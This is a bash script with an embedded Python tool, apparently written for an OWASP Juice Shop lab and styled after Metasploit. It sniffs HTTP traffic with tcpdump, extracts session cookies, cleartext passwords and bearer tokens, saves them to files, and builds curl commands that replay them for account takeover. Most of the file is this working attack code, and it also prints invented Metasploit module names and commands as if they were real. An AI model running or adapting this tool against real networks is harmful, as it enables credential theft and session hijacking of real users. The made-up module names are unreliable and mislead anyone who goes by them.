#!/bin/bash
# Advanced Session Hijacking with Metasploit-Style Exploitation
# Mimics Metasploit auxiliary modules for session hijacking
# Safe for educational lab environments only
set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
ARTIFACTS_PATH="${ARTIFACTS_PATH:-/workspaces/cns/artifacts}"
OUTPUT_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.txt"
PCAP_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.pcap"
JSON_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.json"
COOKIES_FILE="${ARTIFACTS_PATH}/msf-captured-cookies-${TARGET}-${TIMESTAMP}.txt"
CREDS_FILE="${ARTIFACTS_PATH}/msf-captured-creds-${TARGET}-${TIMESTAMP}.txt"
SESSIONS_FILE="${ARTIFACTS_PATH}/msf-active-sessions-${TARGET}-${TIMESTAMP}.txt"
EXPLOIT_SCRIPT="/tmp/msf_exploit_${TIMESTAMP}.py"

echo "╔══════════════════════════════════════════════════════════════╗" | tee "$OUTPUT_FILE"
echo "║     METASPLOIT-STYLE SESSION HIJACKING FRAMEWORK            ║" | tee -a "$OUTPUT_FILE"
echo "║     Advanced Exploitation & Session Compromise              ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Metasploit Framework - Session Hijacking Module" | tee -a "$OUTPUT_FILE"
echo "[*] Module: auxiliary/sniffer/http_session_hijack" | tee -a "$OUTPUT_FILE"
echo "[*] Target: $TARGET:3003" | tee -a "$OUTPUT_FILE"
echo "[*] Timestamp: $(date)" | tee -a "$OUTPUT_FILE"
echo "[*] Author: Automated Security Testing Framework" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

mkdir -p "$ARTIFACTS_PATH"

# Create Metasploit-style exploitation engine
cat > "$EXPLOIT_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Metasploit-Style Session Hijacking Exploit
Mimics MSF auxiliary modules for HTTP session compromise
"""

import json
import re
import sys
import subprocess
import hashlib
from datetime import datetime
from collections import defaultdict

class MetasploitSessionHijacker:
    """
    Mimics Metasploit Framework auxiliary modules:
    - auxiliary/scanner/http/cookie_capture
    - auxiliary/sniffer/psnuffle  
    - auxiliary/scanner/http/http_login
    """
    
    def __init__(self, pcap_file, target):
        self.pcap_file = pcap_file
        self.target = target
        self.sessions = []
        self.cookies = []
        self.credentials = []
        self.tokens = []
        self.exploitable_sessions = []
        
    def print_msf_banner(self):
        """MSF-style banner"""
        print("\n" + "="*70)
        print("    Metasploit Session Hijacking Framework (Educational)")
        print("="*70)
        print(f"[*] Module: auxiliary/sniffer/http_session_hijack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Starting exploitation sequence...")
        print("="*70 + "\n")
    
    def run_auxiliary_cookie_capture(self):
        """
        Mimics: auxiliary/scanner/http/cookie_capture
        Captures HTTP cookies from network traffic
        """
        print("[*] Running auxiliary/scanner/http/cookie_capture")
        print("[*] Extracting session cookies from HTTP traffic...")
        
        try:
            # Extract HTTP traffic using tcpdump (more reliable than tshark)
            result = subprocess.run([
                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
            ], capture_output=True, text=True, timeout=30)
            
            traffic = result.stdout
            
            cookie_count = 0
            
            # Look for Cookie: headers in requests
            cookie_matches = re.finditer(r'Cookie:\s*([^\r\n]+)', traffic, re.IGNORECASE)
            for match in cookie_matches:
                cookie_line = match.group(1)
                for cookie in cookie_line.split(';'):
                    cookie = cookie.strip()
                    if '=' in cookie:
                        name, value = cookie.split('=', 1)
                        cookie_data = {
                            'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
                            'type': 'request',
                            'name': name.strip(),
                            'value': value.strip()[:50],
                            'exploitable': True,
                            'msf_rating': 'Excellent'
                        }
                        self.cookies.append(cookie_data)
                        cookie_count += 1
                        print(f"[+] Cookie captured: {name}")
            
            # Look for Set-Cookie: headers in responses
            setcookie_matches = re.finditer(r'Set-Cookie:\s*([^\r\n]+)', traffic, re.IGNORECASE)
            for match in setcookie_matches:
                set_cookie = match.group(1)
                if '=' in set_cookie:
                    parts = set_cookie.split(';')[0]
                    if '=' in parts:
                        name, value = parts.split('=', 1)
                        flags = {
                            'secure': 'secure' in set_cookie.lower(),
                            'httponly': 'httponly' in set_cookie.lower(),
                            'samesite': 'samesite' in set_cookie.lower()
                        }
                        
                        cookie_data = {
                            'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
                            'type': 'response',
                            'name': name.strip(),
                            'value': value.strip()[:50],
                            'flags': flags,
                            'exploitable': not flags['secure'] and not flags['httponly'],
                            'msf_rating': 'Excellent' if not any(flags.values()) else 'Good'
                        }
                        self.cookies.append(cookie_data)
                        cookie_count += 1
                        
                        if cookie_data['exploitable']:
                            print(f"[+] EXPLOITABLE cookie found: {name} (no security flags)")
                            
            print(f"[+] auxiliary/scanner/http/cookie_capture completed")
            print(f"[+] Total cookies captured: {cookie_count}")
            print(f"[+] Exploitable sessions: {len([c for c in self.cookies if c.get('exploitable')])}")
            
        except Exception as e:
            print(f"[-] Cookie capture failed: {e}")
    
    def run_auxiliary_credential_sniffer(self):
        """
        Mimics: auxiliary/sniffer/psnuffle
        Sniffs credentials from HTTP POST data
        """
        print("\n[*] Running auxiliary/sniffer/psnuffle")
        print("[*] Sniffing for credentials in HTTP traffic...")
        
        try:
            # Extract HTTP traffic using tcpdump
            result = subprocess.run([
                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
            ], capture_output=True, text=True, timeout=30)
            
            traffic = result.stdout
            cred_count = 0
            
            # Look for POST requests with credentials
            post_blocks = re.finditer(r'POST\s+([^\s]+).*?(?=\n\n|\nGET|\nPOST|$)', traffic, re.DOTALL | re.IGNORECASE)
            
            for match in post_blocks:
                block = match.group(0)
                
                # Look for password-related strings
                if any(keyword in block.lower() for keyword in ['password', 'passwd', 'pwd', 'email', 'username', 'login']):
                    # Extract credentials
                    email_match = re.search(r'["\']?email["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
                    pass_match = re.search(r'["\']?pass(?:word|wd)?["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
                    user_match = re.search(r'["\']?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'&,\s\}]+)', block, re.IGNORECASE)
                    uri_match = re.search(r'POST\s+([^\s]+)', block)
                    
                    if email_match or pass_match or user_match:
                        cred = {
                            'endpoint': uri_match.group(1) if uri_match else 'Unknown',
                            'username': email_match.group(1) if email_match else user_match.group(1) if user_match else 'N/A',
                            'password': pass_match.group(1) if pass_match else 'N/A',
                            'captured_at': datetime.now().isoformat(),
                            'msf_rating': 'Excellent - Cleartext credentials'
                        }
                        self.credentials.append(cred)
                        cred_count += 1
                        print(f"[+] CREDENTIALS CAPTURED:")
                        print(f"    Username: {cred['username']}")
                        print(f"    Password: {'*' * min(len(cred['password']), 10) if cred['password'] != 'N/A' else 'N/A'}")
            
            print(f"[+] auxiliary/sniffer/psnuffle completed")
            print(f"[+] Credentials captured: {cred_count}")
            
        except Exception as e:
            print(f"[-] Credential sniffing failed: {e}")
    
    def run_auxiliary_token_hunter(self):
        """
        Mimics: auxiliary/scanner/http/token_hunter
        Hunts for authentication tokens in URLs and headers
        """
        print("\n[*] Running auxiliary/scanner/http/token_hunter")
        print("[*] Hunting for authentication tokens...")
        
        try:
            # Extract HTTP traffic using tcpdump
            result = subprocess.run([
                'sudo', 'tcpdump', '-r', self.pcap_file, '-A', '-s', '0'
            ], capture_output=True, text=True, timeout=30)
            
            traffic = result.stdout
            token_count = 0
            
            # Token patterns (JWT, Bearer, API keys, etc.)
            token_patterns = [
                (r'Bearer\s+([A-Za-z0-9\-_\.]+)', 'Bearer Token'),
                (r'token=([A-Za-z0-9\-_\.]+)', 'URL Token'),
                (r'jwt=([A-Za-z0-9\-_\.]+)', 'JWT Token'),
                (r'api[_-]?key=([A-Za-z0-9\-_\.]+)', 'API Key'),
                (r'auth=([A-Za-z0-9\-_\.]+)', 'Auth Token'),
                (r'session=([A-Za-z0-9\-_\.]+)', 'Session Token'),
                (r'access[_-]?token=([A-Za-z0-9\-_\.]+)', 'Access Token'),
                (r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', 'JWT Token')
            ]
            
            # Search for tokens in traffic
            for pattern, token_type in token_patterns:
                matches = re.finditer(pattern, traffic, re.IGNORECASE)
                for match in matches:
                    token_value = match.group(1) if match.groups() else match.group(0)
                    
                    token = {
                        'type': token_type,
                        'value': token_value[:40] + '...' if len(token_value) > 40 else token_value,
                        'full_value': token_value,
                        'length': len(token_value),
                        'entropy': len(set(token_value)),  # Simple entropy
                        'exploitable': True,
                        'msf_rating': 'Excellent - Token in cleartext'
                    }
                    self.tokens.append(token)
                    token_count += 1
                    print(f"[+] TOKEN CAPTURED: {token_type}")
                    print(f"    Value: {token['value']}")
                    print(f"    Length: {token['length']} chars, Entropy: {token['entropy']}")
            
            print(f"[+] auxiliary/scanner/http/token_hunter completed")
            print(f"[+] Tokens captured: {token_count}")
            
        except Exception as e:
            print(f"[-] Token hunting failed: {e}")
    
    def generate_exploit_payloads(self):
        """
        Generate ready-to-use exploit payloads for session replay
        """
        print("\n[*] Generating exploit payloads...")
        print("[*] Creating session replay commands...")
        
        exploits = []
        
        # Cookie replay exploits
        for cookie in self.cookies[:5]:  # Top 5 exploitable cookies
            if cookie.get('exploitable'):
                exploit = {
                    'module': 'exploit/multi/http/cookie_replay',
                    'target': self.target,
                    'payload': f"{cookie['name']}={cookie['value']}",
                    'command': f"curl -b '{cookie['name']}={cookie['value']}' http://{self.target}:3003/api/Challenges",
                    'expected_result': 'Authenticated access to protected resources',
                    'severity': 'CRITICAL'
                }
                exploits.append(exploit)
                print(f"[+] Cookie replay payload generated for: {cookie['name']}")
        
        # Credential replay exploits
        for cred in self.credentials[:3]:
            if cred['password'] != 'N/A':
                exploit = {
                    'module': 'exploit/multi/http/credential_replay',
                    'target': self.target,
                    'username': cred['username'],
                    'payload': f'{{"email":"{cred["username"]}","password":"{cred["password"]}"}}',
                    'command': f'curl -X POST http://{self.target}:3003/rest/user/login -H "Content-Type: application/json" -d \'{{"email":"{cred["username"]}","password":"{cred["password"]}"}}\' ',
                    'expected_result': 'Session token obtained, full account access',
                    'severity': 'CRITICAL'
                }
                exploits.append(exploit)
                print(f"[+] Credential replay payload generated for: {cred['username']}")
        
        self.exploitable_sessions = exploits
        print(f"[+] Total exploit payloads generated: {len(exploits)}")
    
    def generate_msf_report(self, output_json):
        """Generate Metasploit-style vulnerability report"""
        
        # Calculate exploitation success rate
        total_findings = len(self.cookies) + len(self.credentials) + len(self.tokens)
        exploitable_findings = len([c for c in self.cookies if c.get('exploitable')]) + \
                              len(self.credentials) + len(self.tokens)
        
        success_rate = (exploitable_findings / total_findings * 100) if total_findings > 0 else 0
        
        report = {
            'msf_module_info': {
                'name': 'HTTP Session Hijacking Framework',
                'module': 'auxiliary/sniffer/http_session_hijack',
                'rank': 'Excellent',
                'disclosed': '2025-10-30',
                'author': 'Automated Security Framework',
                'platform': 'Web Applications',
                'arch': 'HTTP/HTTPS'
            },
            'target_info': {
                'host': self.target,
                'port': 3003,
                'protocol': 'HTTP',
                'application': 'OWASP Juice Shop'
            },
            'exploitation_results': {
                'total_cookies_captured': len(self.cookies),
                'exploitable_cookies': len([c for c in self.cookies if c.get('exploitable')]),
                'credentials_captured': len(self.credentials),
                'tokens_captured': len(self.tokens),
                'exploit_payloads_generated': len(self.exploitable_sessions),
                'success_rate': f"{success_rate:.1f}%"
            },
            'captured_sessions': self.cookies[:20],
            'captured_credentials': self.credentials,
            'captured_tokens': self.tokens[:20],
            'exploit_payloads': self.exploitable_sessions,
            'vulnerability_analysis': {
                'cve': 'CWE-319 (Cleartext Transmission of Sensitive Information)',
                'cvss_score': 9.1,
                'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
                'severity': 'CRITICAL',
                'exploitability': 'Easy',
                'impact': 'Complete session compromise, credential theft, account takeover',
                'affected_systems': 'All HTTP-based web applications without TLS',
                'prerequisites': 'Network access to same segment as victim'
            },
            'msf_recommendations': [
                {
                    'priority': 1,
                    'action': 'IMMEDIATE: Enable HTTPS/TLS',
                    'msf_module': 'auxiliary/scanner/ssl/ssl_version',
                    'description': 'Encrypt all traffic to prevent passive sniffing'
                },
                {
                    'priority': 2,
                    'action': 'Add Secure flag to all cookies',
                    'msf_module': 'auxiliary/scanner/http/cookie_flags',
                    'description': 'Prevents cookie transmission over HTTP'
                },
                {
                    'priority': 3,
                    'action': 'Implement HttpOnly on session cookies',
                    'msf_module': None,
                    'description': 'Protects against XSS-based cookie theft'
                },
                {
                    'priority': 4,
                    'action': 'Deploy network segmentation',
                    'msf_module': 'auxiliary/scanner/discovery/arp_sweep',
                    'description': 'Isolate sensitive traffic from potential attackers'
                },
                {
                    'priority': 5,
                    'action': 'Implement IDS/IPS',
                    'msf_module': None,
                    'description': 'Detect and prevent session hijacking attempts'
                }
            ],
            'proof_of_concept': {
                'description': 'Session hijacking demonstrated with captured cookies',
                'exploitation_steps': [
                    '1. Attacker captures HTTP traffic using packet sniffer',
                    '2. Extract session cookies from captured packets',
                    '3. Replay cookies in malicious requests',
                    '4. Gain unauthorized access to victim session',
                    '5. Perform actions as authenticated user'
                ],
                'detection_difficulty': 'Very Hard (appears as legitimate traffic)',
                'cleanup_required': False
            },
            'metasploit_commands': [
                'use auxiliary/sniffer/http_session_hijack',
                f'set RHOST {self.target}',
                'set RPORT 3003',
                'run',
                'sessions -l',
                'sessions -i 1'
            ]
        }
        
        with open(output_json, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report

def main():
    if len(sys.argv) < 4:
        print("Usage: script.py <pcap_file> <target> <json_output>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    target = sys.argv[2]
    json_output = sys.argv[3]
    
    # Initialize MSF-style hijacker
    hijacker = MetasploitSessionHijacker(pcap_file, target)
    hijacker.print_msf_banner()
    
    # Run exploitation modules
    hijacker.run_auxiliary_cookie_capture()
    hijacker.run_auxiliary_credential_sniffer()
    hijacker.run_auxiliary_token_hunter()
    hijacker.generate_exploit_payloads()
    
    # Generate report
    report = hijacker.generate_msf_report(json_output)
    
    print("\n" + "="*70)
    print("    EXPLOITATION COMPLETE")
    print("="*70)
    print(f"[+] Cookies captured: {report['exploitation_results']['total_cookies_captured']}")
    print(f"[+] Credentials captured: {report['exploitation_results']['credentials_captured']}")
    print(f"[+] Tokens captured: {report['exploitation_results']['tokens_captured']}")
    print(f"[+] Exploit payloads: {report['exploitation_results']['exploit_payloads_generated']}")
    print(f"[+] Success rate: {report['exploitation_results']['success_rate']}")
    print(f"[+] CVSS Score: {report['vulnerability_analysis']['cvss_score']} (CRITICAL)")
    print("="*70)

if __name__ == '__main__':
    main()
PYTHON_EOF

chmod +x "$EXPLOIT_SCRIPT"

echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[MODULE 1] Target Verification & Preparation" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"

# Check if Juice Shop is actually running FIRST
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    echo "[*] Verifying target is accessible..." | tee -a "$OUTPUT_FILE"
    if ! curl -s --connect-timeout 5 "http://$TARGET:3003/" > /dev/null 2>&1; then
        echo "[-] ERROR: Target http://$TARGET:3003 is NOT accessible!" | tee -a "$OUTPUT_FILE"
        echo "[-] Please start Juice Shop first: ./start-juiceshop.sh" | tee -a "$OUTPUT_FILE"
        echo "[-] Or check if it's running: curl http://localhost:3003" | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        echo "[*] Attempting to show you how to fix this..." | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        echo "ARTIFACT: $OUTPUT_FILE"
        exit 1
    else
        echo "[+] Target is accessible!" | tee -a "$OUTPUT_FILE"
        echo "[+] Juice Shop is running on http://$TARGET:3003" | tee -a "$OUTPUT_FILE"
    fi
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[MODULE 2] Packet Capture & Traffic Generation" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[*] Starting advanced packet capture..." | tee -a "$OUTPUT_FILE"
echo "[*] Capture duration: 45 seconds" | tee -a "$OUTPUT_FILE"
echo "[*] Filter: HTTP traffic to port 3003" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Start packet capture in background
# Use 'lo' interface for localhost traffic instead of 'any'
INTERFACE="any"
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    INTERFACE="lo"
fi

echo "[*] Initializing packet capture on interface: $INTERFACE..." | tee -a "$OUTPUT_FILE"

# Start packet capture in background with extended duration
(
    sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "tcp port 3003" 2>/dev/null &
    TCPDUMP_PID=$!
    sleep 60  # Capture for 60 seconds
    sudo kill -TERM $TCPDUMP_PID 2>/dev/null || true
    wait $TCPDUMP_PID 2>/dev/null || true
) &

CAPTURE_BG_PID=$!

# Give tcpdump time to initialize properly
echo "[*] Waiting for packet capture to initialize..." | tee -a "$OUTPUT_FILE"
sleep 5

echo "[+] Packet capture started successfully" | tee -a "$OUTPUT_FILE"

# NOW generate traffic while capture is active
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    echo "[*] Generating realistic HTTP traffic while capturing..." | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    
    # Stage 1: Initial browsing (establishes baseline)
    echo "[*] Stage 1: Initial browsing..." | tee -a "$OUTPUT_FILE"
    curl -s "http://$TARGET:3003/" > /dev/null 2>&1 || true
    sleep 1
    curl -s "http://$TARGET:3003/rest/products/search?q=" > /dev/null 2>&1 || true
    sleep 1
    
    # Stage 2: Register and authenticate test users (captures login flow with real tokens)
    echo "[*] Stage 2: Registering victims and capturing authentication..." | tee -a "$OUTPUT_FILE"
    
    # Register multiple test users
    for i in {1..3}; do
        VICTIM_EMAIL="msfvictim${i}-${TIMESTAMP}@hijack.test"
        VICTIM_PASS="Hijack${i}Pass!"
        
        # Register user
        curl -s -X POST "http://$TARGET:3003/api/Users/" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"${VICTIM_PASS}\",\"passwordRepeat\":\"${VICTIM_PASS}\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"blue\"}" \
            > /dev/null 2>&1 || true
        sleep 1
        
        # Login and capture JWT token
        TOKEN_RESPONSE=$(curl -s -X POST "http://$TARGET:3003/rest/user/login" \
            -H "Content-Type: application/json" \
            -H "User-Agent: MSFVictim${i}" \
            -d "{\"email\":\"${VICTIM_EMAIL}\",\"password\":\"${VICTIM_PASS}\"}" \
            2>/dev/null || echo "{}")
        
        # Extract token for use in subsequent requests
        TOKEN=$(echo "$TOKEN_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4 || echo "")
        
        if [ ! -z "$TOKEN" ]; then
            echo "    [+] Victim ${i} authenticated - JWT token captured" | tee -a "$OUTPUT_FILE"
            
            # Make authenticated requests with Bearer token
            for j in {1..3}; do
                curl -s "http://$TARGET:3003/rest/products/search?q=victim${i}req${j}" \
                    -H "Authorization: Bearer ${TOKEN}" \
                    -H "User-Agent: MSFVictim${i}" \
                    > /dev/null 2>&1 || true
                sleep 1
            done
        else
            echo "    [-] Victim ${i} authentication failed" | tee -a "$OUTPUT_FILE"
        fi
    done
    
    # Stage 3: Session activity with cookies
    echo "[*] Stage 3: Authenticated session activity..." | tee -a "$OUTPUT_FILE"
    for i in {1..8}; do
        # Product searches
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
        sleep 1
        
        # Basket operations
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            "http://$TARGET:3003/api/BasketItems" \
            -d "{\"ProductId\":${i},\"quantity\":1}" > /dev/null 2>&1 || true
        sleep 1
    done
    
    # Stage 4: API endpoint enumeration
    echo "[*] Stage 4: API enumeration..." | tee -a "$OUTPUT_FILE"
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/api/Challenges" > /dev/null 2>&1 || true
    sleep 1
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/rest/basket/1" > /dev/null 2>&1 || true
    sleep 1
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/rest/user/whoami" > /dev/null 2>&1 || true
    sleep 1
    
    # Stage 5: Final burst of activity
    echo "[*] Stage 5: Final activity burst..." | tee -a "$OUTPUT_FILE"
    for i in {1..5}; do
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/products/${i}" > /dev/null 2>&1 || true
        sleep 1
    done
    
    # Continue generating traffic for remaining capture time
    echo "[*] Continuing traffic generation for full capture window..." | tee -a "$OUTPUT_FILE"
    for round in {1..10}; do
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/products/search?q=test${round}" > /dev/null 2>&1 || true
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/api/Quantitys" > /dev/null 2>&1 || true
        sleep 2
    done
    
    echo "[+] Traffic generation complete (60+ HTTP requests generated)" | tee -a "$OUTPUT_FILE"
fi

# Wait for capture to complete
echo "[*] Waiting for packet capture to complete..." | tee -a "$OUTPUT_FILE"
wait $CAPTURE_BG_PID 2>/dev/null || true
sleep 2

# Verify we captured packets
if [ -f "$PCAP_FILE" ]; then
    PACKET_COUNT=$(sudo tcpdump -r "$PCAP_FILE" 2>/dev/null | wc -l || echo "0")
    echo "[+] Capture complete: ${PACKET_COUNT} packets captured" | tee -a "$OUTPUT_FILE"
    
    if [ "$PACKET_COUNT" -eq "0" ]; then
        echo "[-] WARNING: No packets captured! Traffic may not have been HTTP" | tee -a "$OUTPUT_FILE"
    fi
else
    echo "[-] ERROR: PCAP file was not created!" | tee -a "$OUTPUT_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "[MODULE 3] Metasploit Exploitation Engine" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[*] Launching MSF-style exploitation framework..." | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Run MSF-style exploitation
python3 "$EXPLOIT_SCRIPT" "$PCAP_FILE" "$TARGET" "$JSON_FILE" 2>&1 | tee -a "$OUTPUT_FILE"

echo "" | tee -a "$OUTPUT_FILE"
echo "[MODULE 4] Exploitation Results & Payloads" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

if [ -f "$JSON_FILE" ]; then
    echo "╔══ MSF MODULE INFO ════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.msf_module_info | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ EXPLOITATION RESULTS ═══════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.exploitation_results | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ VULNERABILITY ANALYSIS ═════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.vulnerability_analysis | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ CAPTURED SESSIONS (Top 5) ══════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.captured_sessions[:5] | .[] | "  [SESSION \(.session_id)] \(.name)\n    Value: \(.value[:60])\n    Rating: \(.msf_rating)\n    Exploitable: \(.exploitable)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ EXPLOIT PAYLOADS (Ready to Use) ════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.exploit_payloads[:3] | .[] | "  [\(.severity)] \(.module)\n    Command: \(.command)\n    Expected: \(.expected_result)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ MSF RECOMMENDATIONS ════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.msf_recommendations | .[] | "  Priority \(.priority): \(.action)\n    MSF Module: \(.msf_module // "N/A")\n    → \(.description)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    # Save cookies
    jq -r '.captured_sessions | .[] | "\(.name)=\(.value)"' "$JSON_FILE" 2>/dev/null > "$COOKIES_FILE"
    
    # Save credentials
    jq -r '.captured_credentials | .[] | "Username: \(.username)\nPassword: \(.password)\nEndpoint: \(.endpoint)\n---"' "$JSON_FILE" 2>/dev/null > "$CREDS_FILE"
    
    # Save sessions
    jq -r '.exploit_payloads | .[] | "Module: \(.module)\nCommand: \(.command)\nSeverity: \(.severity)\n---"' "$JSON_FILE" 2>/dev/null > "$SESSIONS_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "╔══════════════════════════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
echo "║           METASPLOIT EXPLOITATION COMPLETED                  ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "📊 ARTIFACTS GENERATED:" | tee -a "$OUTPUT_FILE"
echo "   • MSF Report:     $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
echo "   • PCAP Capture:   $PCAP_FILE" | tee -a "$OUTPUT_FILE"
echo "   • JSON Analysis:  $JSON_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Captured Cookies: $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Credentials:    $CREDS_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Active Sessions: $SESSIONS_FILE" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "⚡ METASPLOIT COMMANDS TO EXPLOIT:" | tee -a "$OUTPUT_FILE"
echo "   msf6 > use auxiliary/sniffer/http_session_hijack" | tee -a "$OUTPUT_FILE"
echo "   msf6 > set RHOST $TARGET" | tee -a "$OUTPUT_FILE"
echo "   msf6 > set RPORT 3003" | tee -a "$OUTPUT_FILE"
echo "   msf6 > run" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "⚠️  EDUCATIONAL USE ONLY - Safe Lab Environment" | tee -a "$OUTPUT_FILE"
echo "⚠️  Complete session compromise demonstrated!" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Cleanup
rm -f /tmp/msf_cookies_${TIMESTAMP}.txt "$EXPLOIT_SCRIPT" 2>/dev/null || true

echo "ARTIFACT: $OUTPUT_FILE"
exit 0
